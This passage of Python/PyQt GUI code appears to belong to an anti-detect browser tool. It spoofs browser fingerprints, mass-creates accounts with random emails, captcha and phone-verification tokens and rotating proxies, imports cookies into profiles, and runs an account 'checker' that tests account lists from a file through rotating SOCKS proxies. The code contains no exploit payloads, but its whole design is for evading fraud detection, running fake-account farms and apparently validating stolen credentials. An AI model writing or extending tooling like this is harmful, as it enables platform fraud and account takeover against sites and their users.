  		
		currentIndexTab = self.ui.tabWidgetMain.currentIndex()
  
		self.onTabMiddleClick(currentIndexTab)
  
		if not self.mainWindow.setingData['create_data']:
			self.ui.tabWidgetMain.setTabVisible(5, False)
		else:
			#list_creator_function
			self.list_creator_function = list(self.mainWindow.setingData['create_data'])
			self.list_creator_comboBox = [line['value'] for line in self.list_creator_function]
			self.ui.comboBoxCreatorType.addItems(self.list_creator_comboBox)
		if not self.mainWindow.setingData['check_data']:
			self.ui.tabWidgetMain.setTabVisible(6, False)
		else:
			#list_checker_function
			self.list_checker_function = list(self.mainWindow.setingData['check_data'])
			self.list_checker_comboBox = [line['value'] for line in self.list_checker_function]
			self.ui.checksitecomboBox.addItems(self.list_checker_comboBox)
   

		# self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))  
  
		# self.ui.tabWidgetMain.setTabVisible(6, False)
	
		self.inject_info = self.mun_api.get_inject_info()
  
		if not self.statustheard:
			self.statustheard = Update_status_worker(self,self.statusqueue)
			self.statustheard.trigger.connect(self.update_status)
			self.statustheard.start()  
   
		self.checkBoxAll = QCheckBox('Select All')
		self.checkBoxAll.setChecked(False)

	def getCheckerAccounts(self):
		checksitecomboBox = self.ui.checksitecomboBox.currentText()
		lineEditListCheck = self.ui.lineEditListCheck.text()
		socktypecomboBox = self.ui.socktypecomboBox.currentText()
		lineEditSocksToken = self.ui.lineEditSocksToken.text()
		lineEditSocksTimes = self.ui.lineEditSocksTimes.text()
		comboBoxcheck_ssh_database = self.ui.comboBoxcheck_ssh_database.currentText()
		socksTextEdit = self.ui.socksTextEdit.toPlainText()
		
		data_put = {}
		data_put['check_site'] = checksitecomboBox
		data_put['check_path'] = lineEditListCheck
		data_put['socks_type'] = socktypecomboBox
		data_put['socks_token'] = lineEditSocksToken
		data_put['socks_times'] = lineEditSocksTimes
		data_put['socks_data'] = socksTextEdit
		data_put['ssh_database'] = comboBoxcheck_ssh_database
		return data_put


	def start_checker(self):
		print('==start_checker==')
		self.limitThreading = self.ui.lineEdittheard.text()
		while self.totalAntiDetectQueue < int(self.limitThreading):
			# if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1

		data_put = self.getCheckerAccounts()
		print('=======', data_put['check_site'])
		if data_put['check_site'] != 'Get Link Checkout' and  data_put['check_site'] != 'Checker bot':
			if not data_put['check_path']:
				QtWidgets.QMessageBox.about(self, "Error", "Please select file for checking!")
				return
		if data_put['socks_type'] == '922 proxy' and not data_put['socks_token']:
			QtWidgets.QMessageBox.about(self, "Error", "Please input socks token!")
			return
		if not data_put['socks_times']:
			QtWidgets.QMessageBox.about(self, "Error", "Please input socks times!")
			return	
		self.total_check_list = 0
		self.total_checked = 0
		self.total_unkown = 0
		self.total_invalid = 0
		self.total_valid = 0
		if data_put['check_site'] == 'Get Link Checkout':
			data_put['action'] = 'get_link_checkout'
			self.total_check_list = int(data_put['socks_times']) * int(self.limitThreading)
			i = 0
			while i < int(self.limitThreading):
				self.antiDetectQueque.put(data_put)	
				i+=1

		elif data_put['check_site'] == 'Checker bot':
			data_put['action'] = 'telegram_bot'
			self.total_check_list = int(data_put['socks_times']) * int(self.limitThreading)
			i = 0
			while i < int(self.limitThreading):
				self.antiDetectQueque.put(data_put)	
				i+=1 
		else:
			data_put['action'] = 'check_accounts'
			self.antiDetectQueque.put(data_put)	

		
 
	def checker_save_file(self):
		self.fileSavePath, typeFile = QtWidgets.QFileDialog.getSaveFileName(self, "Select files to Save!", self.lastFilePath);
		if self.fileSavePath:
			self.ui.lineEditListSave.setText(self.fileSavePath)
			

	def checker_select_file(self):

		self.fileForumPath, type_file = QtWidgets.QFileDialog.getOpenFileName(self, "Select files to Check Account!",
															   self.lastFilePath);
  
		self.ui.lineEditListCheck.setText(self.fileForumPath)

  
	def set_black_list_emails(self):
		print('==set_black_list_emails==', len(self.listSignupEmailsChecked))
		comboBoxCreatorType = self.ui.comboBoxCreatorType.currentText()
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1

		data_put = {}
		data_put['action'] = 'set_black_list_emails'
		data_put['data'] = self.listSignupEmailsChecked
		data_put['type'] = comboBoxCreatorType
		self.antiDetectQueque.put(data_put)			
  	
  
  
	def show_email_signup_list(self):
		# self.emailSignupListUI = EmailSignupListSetup(self)
		#emails signup
		comboBoxCreatorType = self.ui.comboBoxCreatorType.currentText()
  
		self.show_all_signup_email(comboBoxCreatorType)
  
		
		# self.emailSignupListUI.show()	
  



	def show_all_signup_email(self, typeEmail):
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1

		data_put = {}
		data_put['action'] = 'show_all_signup_email'
		data_put['type'] = typeEmail
		self.antiDetectQueque.put(data_put)		
  
  
	def import_cookies_to_profile(self):
		if len(self.listProfilesChecked) > 0:
			print('==import cookies to profile==')
			self.fileCookiesPath, type_file = QtWidgets.QFileDialog.getOpenFileName(self, "Select files to import!",
																self.lastFilePath);
			if self.fileCookiesPath:
				for line_profile_id in self.listProfilesChecked:
					if self.totalAntiDetectQueue < int(self.limitThreading):
						self.AntiDetectTheard = AntiDetectThread(
							self.antiDetectQueque, self.statusqueue)
						self.AntiDetectTheard.start()
						self.totalAntiDetectQueue += 1
					data_put = {}
					data_put['action'] = 'import_cookies_to_profile'
					data_put['profile_id'] = str(line_profile_id)
					data_put['profile_path_cookies'] = str(self.fileCookiesPath)
					data_put['inject_info'] = self.inject_info['data']
					self.antiDetectQueque.put(data_put)
		else:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the profiles!")

	def generate_string(self):
		alphabet = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		min = 5
		max = 7
		stringimg = ''
		list_domain = ['yahoo.com', 'hotmail.com', 'oulook.com']
		mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
		for x in random.sample(alphabet, random.randint(min, max)):
			stringimg += x
		username_chuan = stringimg
		# print(checkout_form
		self.email_chuan = username_chuan + '@' + mail_domain
		return username_chuan  
	def creator_run(self):
		print('===creator_run===')
		lineEditCreatorThreading = self.ui.lineEditCreatorThreading.text()
		list_random = ['iPhone', 'Android']
		self.random_profile_setting(specificDevices=list_random[random.randint(0, len(list_random)-1)])
  
		profilesBrowser = self.getCreateProfile()
		data = self.getCreatorAccount()
		if not data:
			return
		profilesBrowser['profile_name'] = data['account_type']+'_'+self.generate_string()
		# print(profilesBrowser)
		if not profilesBrowser['profile_name']:
			QtWidgets.QMessageBox.warning(
				self, 'Error', 'Input profile name!')
			return  
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		
			
		data_put = {}
		data_put['action'] = 'create_accounts'
		data_put['data'] = data
		data_put['profile_browser'] = profilesBrowser
		data_put['inject_info'] = self.inject_info['data']
		if self.listSignupEmailsChecked:
			data_put['selected_emails'] = self.listSignupEmailsChecked
		self.antiDetectQueque.put(data_put)	
  
  
	def generate_data_for_create(self):
		print('===generate_data_for_create===')
		# self.checkBoxAll.stateChanged.connect(self.on_stateChanged)
	def get_email_for_creator(self, account_type):
		print('===get_email_for_creator===')
	def get_data_for_creator(self, account_type):
		print('===get_data_for_creator===')
	def get_proxy_for_creator(self, socksInfo):
		print('===get_proxy_for_creator===')

	def get_list_proxy_from_plaintext(self):
		plainTextEditCreatorProxies = self.ui.plainTextEditCreatorProxies.toPlainText()
		list_proxies = []
		for line in plainTextEditCreatorProxies.strip().split('\n'):
			if line.strip():
				list_proxies.append(line)
		proxy = list_proxies.pop(0)
		listToStr = '\n'.join([str(elem) for elem in list_proxies])
		self.ui.plainTextEditCreatorProxies.setPlainText(listToStr)
		return proxy

	def getCreatorAccount(self):
		comboBoxCreatorType = self.ui.comboBoxCreatorType.currentText()
		comboBoxCreatorTypeEmail = self.ui.comboBoxCreatorTypeEmail.currentText()
		comboBoxCreatorTypePassword = self.ui.comboBoxCreatorTypePassword.currentText()
		comboBoxCreatorTypeCaptcha = self.ui.comboBoxCreatorTypeCaptcha.currentText()
		comboBoxCreatorTypePhone = self.ui.comboBoxCreatorTypePhone.currentText()
		comboBoxCreatorProxy = self.ui.comboBoxCreatorProxy.currentText()
		lineEditCreatorEmail = self.ui.lineEditCreatorEmail.text()
		lineEditCreatorPassword = self.ui.lineEditCreatorPassword.text()
		lineEditCreatorCaptchaToken = self.ui.lineEditCreatorCaptchaToken.text()
		lineEditCreatorPhone = self.ui.lineEditCreatorPhone.text()
		lineEditCreatorPhoneToken = self.ui.lineEditCreatorPhoneToken.text()
		lineEditCreatorProxyToken = self.ui.lineEditCreatorProxyToken.text()
		lineEditCreatorThreading = self.ui.lineEditCreatorThreading.text()
		# plainTextEditCreatorProxies = self.ui.plainTextEditCreatorProxies.toPlainText()
		
		
		data = {}
		data['account_type'] = comboBoxCreatorType
		data['email_type'] = comboBoxCreatorTypeEmail
		data['password_type'] = comboBoxCreatorTypePassword
		data['captcha_type'] = comboBoxCreatorTypeCaptcha
		data['phone_type'] = comboBoxCreatorTypePhone
		data['proxy_type'] = comboBoxCreatorProxy
		data['account_email'] = lineEditCreatorEmail
		data['account_password'] = lineEditCreatorPassword
		data['captcha_token'] = lineEditCreatorCaptchaToken
		data['account_phone'] = lineEditCreatorPhone
		data['phone_token'] = lineEditCreatorPhoneToken
		data['proxy_token'] = lineEditCreatorProxyToken
		if comboBoxCreatorProxy != '922 proxy' and comboBoxCreatorProxy != 'Tinsoft':
			data['account_proxy_type'] = 'socks5'
			data['account_proxy'] = self.get_list_proxy_from_plaintext()
		elif not lineEditCreatorProxyToken.strip():
			QtWidgets.QMessageBox.about(self, "Error", "Please input the proxy token!")
			return
		if comboBoxCreatorTypeEmail == 'Specific' and not lineEditCreatorEmail.strip():
			QtWidgets.QMessageBox.about(self, "Error", "Please input the email!")
			return
		if comboBoxCreatorTypePassword == 'Specific' and not lineEditCreatorPassword.strip():
			QtWidgets.QMessageBox.about(self, "Error", "Please input the password!")
			return
		return data
	def showProfileAddAccounts(self):
		profileId = ''
		if len(self.listProfilesChecked) > 1:
			QtWidgets.QMessageBox.about(self, "Error", "Please select only one profile!")
		if len(self.listProfilesChecked) == 1:
			profileId = self.listProfilesChecked[0]
		
		self.profileAddAccountSetupUi = ProfileAddAccountsetup(self,profileId)

		self.profileAddAccountSetupUi.show()	
  
	def refreshEmailSubjects(self):
		data_put = {}
		data_put['action'] = 'connect_email'
		data_put['email'] = self.email_connected
		self.antiDetectQueque.put(data_put)
		# self.email_connected = row_db
	def showEmailBody(self):
		indexes = self.ui.tableWidgetEmailSubjects.selectionModel().selectedRows()
		list_subjects = sorted(indexes)
		if len(list(list_subjects)) == 1:
			# print(list_subjects[0].row())
			html = self.emails_rows[list_subjects[0].row()]['html']
			if html.strip():
				self.ui.textBrowserEmailView.setHtml(html)
			else:
				body_text = self.emails_rows[list_subjects[0].row()]['text']
				self.ui.textBrowserEmailView.setText(body_text)
	def onTabMiddleClick(self, index):
		if index == 0:
			self.show_all_profiles()
		elif index == 1:
			self.show_all_accounts()
		elif index == 2:
			self.show_all_emails()
		elif index == 3:
			self.show_all_data()
		elif index == 5:
			self.show_email_signup_list()
	
	def accounts_update_new_profiles(self):
		if not self.listAccountsChecked:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the accounts")
			return
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'accounts_update_new_profiles'
		data_put['list_checked'] = self.listAccountsChecked
		self.antiDetectQueque.put(data_put)		
  
	def profile_update_new_profiles(self):
		if not self.listAccountsChecked:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the profiles")
			return
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'update_new_profiles'
		data_put['list_checked'] = self.listProfilesChecked
		self.antiDetectQueque.put(data_put)		
	
	def set_auto_view(self):
		if not self.listAccountsChecked:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the accounts")
			return
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'set_auto_view'
		data_put['list_checked'] = self.listAccountsChecked
		self.antiDetectQueque.put(data_put)
  
	def remove_auto_view(self):
		if not self.listAccountsChecked:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the accounts")
			return
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'remove_auto_view'
		data_put['list_checked'] = self.listAccountsChecked
		self.antiDetectQueque.put(data_put)   
	
	def show_all_accounts(self):

		if  self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'show_all_accounts'
		self.antiDetectQueque.put(data_put)

	def show_all_emails(self):

		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'show_all_emails'
		self.antiDetectQueque.put(data_put)
 
	def show_all_data(self):

		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'show_all_data'
		self.antiDetectQueque.put(data_put)
  
	def add_account_setup(self):
		self.accountSetupUi = AddAccountsetup(self)
		self.accountSetupUi.show()
 
	def add_emails_setup(self):
		self.addEmailsSetupUi = AddEmailsetup(self)
		self.addEmailsSetupUi.show()
 
	def remove_profiles(self):
		if len(self.listProfilesChecked) > 0:
			qm = QtWidgets.QMessageBox
			ret = qm.question(self,'', "Are you sure to remove the selected profiles?", qm.Yes | qm.No)
			if ret == qm.Yes:
				print('===remove==')
				if self.totalAntiDetectQueue < int(self.limitThreading):
					self.AntiDetectTheard = AntiDetectThread(
						self.antiDetectQueque, self.statusqueue)
					self.AntiDetectTheard.start()
					self.totalAntiDetectQueue += 1
				data_put = {}
				data_put['action'] = 'remove_profiles'
				data_put['list_checked'] = self.listProfilesChecked
				self.antiDetectQueque.put(data_put)
		else:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the profiles")
 
	def remove_emails(self):
		if len(self.listEmailsChecked) > 0:
			qm = QtWidgets.QMessageBox
			ret = qm.question(
				self, '', "Are you sure to remove the selected emails?", qm.Yes | qm.No)
			if ret == qm.Yes:
				print('===remove emails==')
				if self.totalAntiDetectQueue < int(self.limitThreading):
					self.AntiDetectTheard = AntiDetectThread(
						self.antiDetectQueque, self.statusqueue)
					self.AntiDetectTheard.start()
					self.totalAntiDetectQueue += 1
				data_put = {}
				data_put['action'] = 'remove_emails'
				data_put['list_checked'] = self.listEmailsChecked
				self.antiDetectQueque.put(data_put)
		else:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the emails") 
  
	def remove_accounts(self):
		if len(self.listAccountsChecked) > 0:
			qm = QtWidgets.QMessageBox
			ret = qm.question(
				self, '', "Are you sure to remove the selected accounts?", qm.Yes | qm.No)
			if ret == qm.Yes:
				print('===remove accounts==')
				if self.totalAntiDetectQueue < int(self.limitThreading):
					self.AntiDetectTheard = AntiDetectThread(
						self.antiDetectQueque, self.statusqueue)
					self.AntiDetectTheard.start()
					self.totalAntiDetectQueue += 1
				data_put = {}
				data_put['action'] = 'remove_accounts'
				data_put['list_checked'] = self.listAccountsChecked
				self.antiDetectQueque.put(data_put)
		else:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the accounts")
  
	def get_selected_table_accounts(self):
		print('===get selected accounts===')
 
 
	def startViewAccount(self):
     
		account_type = self.ui.comboBoxAccountType.currentText()

		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'view_products'
		data_put['inject_info'] = self.inject_info['data']
		data_put['account_type'] = account_type
		data_put['list_checked'] = self.listAccountsChecked
  
		# inject_info = ''
		self.antiDetectQueque.put(data_put)	
  
	def setTableHeaderField(self,tableWidget, list_header=[]):

		tableWidget.setColumnCount(len(list_header))   # 设置列数

		header = CheckBoxHeader()               # 实例化自定义表头
		tableWidget.setHorizontalHeader(header)            # 设置表头
		tableWidget.setHorizontalHeaderLabels(list_header)        # 设置行表头字段
		# self.tableWidget.setColumnWidth(0, 100)       # 设置第0列宽度
		header.select_all_clicked.connect(header.change_state)
  	
	def startCreateAccount(self):
     
		account_type = self.ui.comboBoxAccountType.currentText()
		self.random_profile_setting()
		profilesBrowser = self.getCreateProfile()
  
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'create_account'
		data_put['profile_browser'] = profilesBrowser
		data_put['inject_info'] = self.inject_info['data']
		data_put['account_type'] = account_type
  
		# inject_info = ''
		self.antiDetectQueque.put(data_put)
  
	def save_accounts_changes(self, item):
		if not self.refesh_table:
			if self.totalAntiDetectQueue < int(self.limitThreading):
				self.AntiDetectTheard = AntiDetectThread(
					self.antiDetectQueque, self.statusqueue)
				self.AntiDetectTheard.start()
				self.totalAntiDetectQueue += 1
			print('===projectName===',self.ui.tableWidgetAccounts.item(item.row(), item.column()).text())
			update_value = self.ui.tableWidgetAccounts.item(item.row(), item.column()).text()
			name_update = None
			if item.column() == 2:
				name_update = 'profile_os'
			elif item.column() == 3:
				name_update = 'proxy'
			elif item.column() == 4:
				name_update = 'socks5'
			elif item.column() == 5:
				name_update = 'proxy_username'    
			elif item.column() == 6:
				name_update = 'proxy_password'    
			elif item.column() == 8:
				name_update = 'email'
			elif item.column() == 9:
				name_update = 'username'
			elif item.column() == 10:
				name_update = 'password' 
			elif item.column() == 12:
				name_update = 'note'
			elif item.column() == 15:
				name_update = 'browser_profiles'
			if name_update:
				data_update = {}
				data_update['id'] = self.ui.tableWidgetAccounts.item(item.row(), 1).text()
				data_update['update_data'] =  {name_update:update_value}
				# if item.column() == 4:
				# 	data_update['update_data'].update({'profile_proxy_type':1})
				# elif item.column() == 5:
				# 	data_update['update_data'].update({'profile_proxy_type': 2})
				print(data_update)
				data_put = {}
				data_put['action'] = 'update_data_accounts'
				data_put['data_update'] = data_update


				# inject_info = ''
				self.antiDetectQueque.put(data_put)
						
	def save_profiles_changes(self, item):
		if not self.refesh_table:
			if self.totalAntiDetectQueue < int(self.limitThreading):
				self.AntiDetectTheard = AntiDetectThread(
					self.antiDetectQueque, self.statusqueue)
				self.AntiDetectTheard.start()
				self.totalAntiDetectQueue += 1
			print('===projectName===',self.ui.tableWidgetProfiles.item(item.row(), item.column()).text())
			update_value = self.ui.tableWidgetProfiles.item(item.row(), item.column()).text()
			name_update = None
			if item.column() == 2:
				name_update = 'profile_os'
			elif item.column() == 7:
				name_update = 'profile_name'
			elif item.column() == 9:
				name_update = 'profile_note'
			elif item.column() == 3:
				name_update = 'profile_proxy_details' 
			elif item.column() == 4:
				name_update = 'profile_socks5_details'
			elif item.column() == 5:
				name_update = 'profile_proxy_username'
			elif item.column() == 6:
				name_update = 'profile_proxy_password'
			if name_update:
				data_update = {}
				data_update['id'] = self.ui.tableWidgetProfiles.item(item.row(), 1).text()
				data_update['update_data'] =  {name_update:update_value}
				if item.column() == 3:
					data_update['update_data'].update({'profile_proxy_type':1})
				elif item.column() == 4:
					data_update['update_data'].update({'profile_proxy_type': 2})
				print(data_update)
				data_put = {}
				data_put['action'] = 'update_data'
				data_put['data_update'] = data_update


				# inject_info = ''
				self.antiDetectQueque.put(data_put)
				
	def show_all_profiles(self):

		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(
				self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue += 1
		data_put = {}
		data_put['action'] = 'get_all_profiles'
		self.antiDetectQueque.put(data_put)

	def random_profile_setting(self, comboBoxOS=None, specificDevices=None):
		

		if specificDevices:
			comboBoxDevices = specificDevices
			if comboBoxDevices == 'iPhone':
				self.ui.comboBoxDevices.setCurrentIndex(1)
				print('==set iphone==')
			elif comboBoxDevices == 'Android':
				self.ui.comboBoxDevices.setCurrentIndex(2)
				print('==set Android==')
		comboBoxDevices = self.ui.comboBoxDevices.currentText()
		self.ui.comboBoxRenderer.setCurrentIndex(random.randint(0, self.ui.comboBoxRenderer.count()-1))
		self.ui.comboBoxVendor.setCurrentIndex(random.randint(0, self.ui.comboBoxVendor.count()-1)) 
		self.ui.comboBoxCpu.setCurrentIndex(random.randint(0, self.ui.comboBoxCpu.count()-1))
		self.ui.comboBoxResoluton.setCurrentIndex(random.randint(0, self.ui.comboBoxResoluton.count()-1))  
		self.ui.comboBoxVersion.setCurrentIndex(random.randint(0, self.ui.comboBoxVersion.count()-1))   
		if comboBoxDevices == 'iPhone':
			self.list_phone_os = list(self.list_iPhone_resolution.keys())
			self.ui.comboBoxPhoneOS.clear()
			self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
			self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))  
		elif comboBoxDevices == 'Android':
			self.list_phone_os = list(self.list_android_resolution.keys())
			self.ui.comboBoxPhoneOS.clear()
			self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
			self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))
		if not comboBoxOS:
			if comboBoxDevices == 'Desktop':
				self.ui.comboBoxOS.setCurrentIndex(random.randint(0, self.ui.comboBoxOS.count()-1))
			else:
				self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))
		else:
			if comboBoxDevices == 'Desktop':
				self.ui.comboBoxOS.setCurrentIndex(random.randint(0, comboBoxOS))
			else:
				self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, comboBoxOS))
    
		self.set_user_agent(comboBoxDevices)

	def set_user_agent(self, comboBoxDevices):
		
		if comboBoxDevices == 'Desktop':
			AgentOperationOS = ''
			if self.ui.comboBoxOS.currentText() == 'Window':
				AgentOperationOS = 'Windows NT 10.0; Win64; x64'
			elif self.ui.comboBoxOS.currentText() == 'Mac OS X':
				os_version = self.list_apple_ios[random.randint(0, len(self.list_apple_ios)-1)]
				AgentOperationOS = 'Macintosh; Intel Mac OS X '+ os_version
			elif self.ui.comboBoxOS.currentText() == 'Linux':
				AgentOperationOS = 'X11; Linux x86_64'
			else:
				AgentOperationOS = "X11; CrOS x86_64 14909.100.0"
			
			Agentversion = self.ui.comboBoxVersion.currentText()
			self.user_header_set = "Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36" % (AgentOperationOS, Agentversion)
		else:
			Agentversion = self.ui.comboBoxVersion.currentText()
			comboBoxPhoneOS = self.ui.comboBoxPhoneOS.currentText()
			if comboBoxPhoneOS.lower().find('iphone') != -1:
				os_version = self.list_apple_ios[random.randint(0, len(self.list_apple_ios)-1)]
				self.user_header_set = "Mozilla/5.0 (iPhone; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/%s Mobile/15E148 Safari/604.1" % (os_version, Agentversion)
			elif comboBoxPhoneOS.strip():
				os_version = self.list_android_os[random.randint(0, len(self.list_android_os)-1)]
				self.user_header_set = "Mozilla/5.0 (Linux; Android %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36 TwitterAndroid" % (os_version, self.list_android_resolution[comboBoxPhoneOS]['model'], Agentversion)
			else:
				return
				
   
   		
		self.ui.lineEditUserAgent.setText(self.user_header_set)
	
	def getCreateProfile(self):
		profile_name = self.ui.lineEditProfileName.text()
		comboBoxDevices = self.ui.comboBoxDevices.currentText()
		if comboBoxDevices == 'Desktop':
			profile_os = self.ui.comboBoxOS.currentText()
			profile_resolution = self.ui.comboBoxResoluton.currentText()
		else:
			profile_os = self.ui.comboBoxPhoneOS.currentText()
			if profile_os.lower().find('iphone') != -1:
				profile_resolution = self.list_iPhone_resolution[profile_os]['resolution']
			else:
				profile_resolution = self.list_android_resolution[profile_os]['resolution']
		profile_browser = self.ui.comboBoxBrowser.currentText()
		profile_version = self.ui.comboBoxVersion.currentText()
		profile_proxy_type = self.ui.comboBoxProxyType.currentText()
		profile_proxy_details = self.ui.lineEditProxy.text()
		if profile_proxy_type == 'Socks5':
			profile_socks5_details = profile_proxy_details
			profile_proxy_details = ''
		elif profile_proxy_type == 'No Proxy':
			profile_socks5_details = ''
			profile_proxy_details = ''
		else:
			profile_socks5_details = ''

		
		profile_proxy_username = self.ui.lineEditProxyUsername.text()	
		profile_proxy_password = self.ui.lineEditProxyPassword.text()	
		profile_path_cookies = self.ui.lineEditCookies.text()
		profile_user_agent = self.ui.lineEditUserAgent.text()
		# profile_resolution = self.ui.comboBoxResoluton.currentText()
		profile_cpu = self.ui.comboBoxCpu.currentText()
		profile_canvas = self.ui.comboBoxCanvas.currentText()
		profile_rects = self.ui.comboBoxRects.currentText()
		profile_font = self.ui.comboBoxFont.currentText()
		profile_audio = self.ui.comboBoxAudio.currentText()
		profile_webgl = self.ui.comboBoxWebgl.currentText()
		profile_time_zone = self.ui.comboBoxTimeZone.currentText()
		profile_webrtc = self.ui.comboBoxWebRtc.currentText()
		profile_geo = self.ui.comboBoxGeo.currentText()
		profile_vendor = self.ui.comboBoxVendor.currentText()
		profile_renderer = self.ui.comboBoxRenderer.currentText()
		profile_start_url = self.ui.lineEditStartUrl.text()
		create_profile = {
			'profile_name':profile_name,
			'profile_os':profile_os,
			'profile_browser':profile_browser,
			'profile_version':profile_version,
			'profile_proxy_type':profile_proxy_type,
			'profile_socks5_details':profile_socks5_details,
			'profile_proxy_details':profile_proxy_details,
			'profile_proxy_username':profile_proxy_username,
			'profile_proxy_password':profile_proxy_password,
			'profile_path_cookies':profile_path_cookies,
			'profile_user_agent':profile_user_agent,
			'profile_resolution':profile_resolution,
			'profile_cpu':profile_cpu,
			'profile_canvas':profile_canvas,
			'profile_rects':profile_rects,
			'profile_font':profile_font,
			'profile_audio':profile_audio,
			'profile_webgl':profile_webgl,
			'profile_time_zone':profile_time_zone,
			'profile_webrtc':profile_webrtc,
			'profile_geo':profile_geo,
			'profile_vendor':profile_vendor,
			'profile_renderer':profile_renderer,
			'profile_start_url':profile_start_url
		}
		return create_profile
  
	def startCreateProfile(self):
		print('==startCreateProfile==')
		# global orderfunction
		# if not orderfunction:
		# 	QtWidgets.QMessageBox.about(self, "Error", "Contact Dev for approval")
		# 	self.validTextEdit.setPlainText(hwid.Hwid().get_hwid())
		# 	return

		profilesBrowser = self.getCreateProfile()
		if not profilesBrowser['profile_name']:
			QtWidgets.QMessageBox.warning(
				self, 'Error', 'Input the profile name!')
			return
		if self.totalAntiDetectQueue < int(self.limitThreading):
			self.AntiDetectTheard = AntiDetectThread(self.antiDetectQueque, self.statusqueue)
			self.AntiDetectTheard.start()
			self.totalAntiDetectQueue+=1
		data_put = {}
		data_put['action'] = 'create_profile'
		data_put['profile_browser'] = profilesBrowser
		data_put['inject_info'] = self.inject_info['data']
		self.antiDetectQueque.put(data_put)
  
	def on_comboboxOS_changed(self, value):
		comboBoxDevices = self.ui.comboBoxDevices.currentText()
		# if comboBoxDevices == 'iPhone':
		# 	self.list_phone_os = list(self.list_iPhone_resolution.keys())
		# 	self.ui.comboBoxPhoneOS.clear()
		# 	self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
		# 	self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))  
		# elif comboBoxDevices == 'Android':
		# 	self.list_phone_os = list(self.list_android_resolution.keys())
		# 	self.ui.comboBoxPhoneOS.clear()self.list_browsers
		# 	self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
		# 	self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))
		# else:
		# 	self.ui.comboBoxPhoneOS.clear()
		self.set_user_agent(comboBoxDevices)
  
	def on_comboBoxDevices_changed(self, value):
		comboBoxDevices = self.ui.comboBoxDevices.currentText()
